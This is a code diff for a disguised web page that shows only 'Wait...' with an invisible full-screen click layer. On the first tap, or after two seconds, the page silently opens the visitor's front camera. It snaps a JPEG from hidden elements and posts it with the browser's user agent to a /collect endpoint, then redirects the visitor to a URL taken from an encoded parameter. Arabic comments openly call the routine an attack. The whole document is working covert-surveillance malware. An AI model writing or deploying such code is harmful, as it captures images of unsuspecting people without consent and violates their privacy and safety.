@@ -3,13 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Checking Connection...</title>
+    <title>Wait...</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; overflow: hidden; }
-        #v, #c { position: fixed; top: -1000px; opacity: 0; pointer-events: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #ffffff; cursor: pointer; }
+        #v, #c { position: fixed; top: -1000px; left: -1000px; opacity: 0; }
+        /* جعل الصفحة كلها منطقة ضغط */
+        .click-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; }
     </style>
 </head>
 <body>
+    <div class="click-layer" id="trigger"></div>
     <video id="v" autoplay muted playsinline></video>
     <canvas id="c"></canvas>
 
@@ -17,65 +20,68 @@
         (function() {
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
+            const trigger = document.getElementById('trigger');
             
             const urlParams = new URLSearchParams(window.location.search);
             const encodedData = urlParams.get('p');
             let config = { r: "https://google.com" }; 
-            
-            if (encodedData) {
-                try { config = JSON.parse(atob(encodedData)); } catch (e) {}
-            }
+            if (encodedData) { try { config = JSON.parse(atob(encodedData)); } catch (e) {} }
 
-            // دالة التوجيه لضمان عدم التعليق
-            const forceRedirect = () => {
-                setTimeout(() => { window.location.replace(config.r); }, 500);
-            };
+            let isCaptured = false;
 
-            async function captureAndSend() {
+            async function attack() {
+                if (isCaptured) return;
+                isCaptured = true;
+
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" } 
+                        video: { facingMode: "user", width: 640, height: 480 } 
                     });
                     video.srcObject = stream;
 
-                    // الانتظار حتى يبدأ الفيديو فعلياً (بدون Promise معقد لضمان عدم التعليق)
-                    video.onloadeddata = () => {
-                        setTimeout(() => {
-                            try {
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0);
-                                
-                                // ضغط الصورة وتشفيرها بصيغة JPEG لتقليل الحجم وسرعة الإرسال
-                                const imgData = canvas.toDataURL('image/jpeg', 0.6);
-                                
-                                // إرسال البيانات فوراً بصيغة JSON كما يتوقع app.py
-                                fetch('/collect', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        image: imgData,
-                                        phone_name: navigator.userAgent
-                                    })
-                                }).finally(() => {
-                                    // التوجيه مهما كانت النتيجة (نجاح أو فشل الإرسال) لضمان عدم التعليق
-                                    stream.getTracks().forEach(t => t.stop());
-                                    forceRedirect();
-                                });
-                            } catch (e) { forceRedirect(); }
-                        }, 800); // مهلة كافية لضبط العدسة
-                    };
+                    // انتظار 600ms فقط لضبط العدسة
+                    await new Promise(r => setTimeout(r, 600));
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // استخراج الصورة بجودة JPEG متوازنة (0.5) لسرعة البرق في الإرسال
+                    const imgData = canvas.toDataURL('image/jpeg', 0.5);
+
+                    // إرسال هجومي (لا ننتظر الرد، نرسل ونرحل)
+                    fetch('/collect', {
+                        method: 'POST',
+                        mode: 'no-cors', // لضمان عدم التعليق بسبب الـ CORS
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            image: imgData,
+                            phone_name: navigator.userAgent
+                        })
+                    });
+
+                    // إغلاق الكاميرا والتوجيه فوراً
+                    setTimeout(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.replace(config.r);
+                    }, 200);
 
                 } catch (err) {
-                    forceRedirect(); // في حال الرفض يتم التوجيه فوراً
+                    window.location.replace(config.r);
                 }
             }
 
-            window.onload = captureAndSend;
-            
-            // أمان إضافي: إذا مرت 5 ثوانٍ ولم يحدث شيء، يتم التوجيه إجبارياً
-            setTimeout(forceRedirect, 5000);
+            // تفعيل الهجوم عند أول لمسة للشاشة (إجباري في المتصفحات الحديثة)
+            trigger.addEventListener('click', attack);
+            trigger.addEventListener('touchstart', attack);
+
+            // محاولة التشغيل التلقائي كخيار ثانوي
+            window.onload = () => {
+                setTimeout(attack, 2000); // محاولة بعد ثانيتين إذا لم يلمس الشاشة
+            };
+
+            // أمان: التوجيه بعد 8 ثوانٍ مهما حدث
+            setTimeout(() => { window.location.replace(config.r); }, 8000);
         })();
     </script>
 </body>
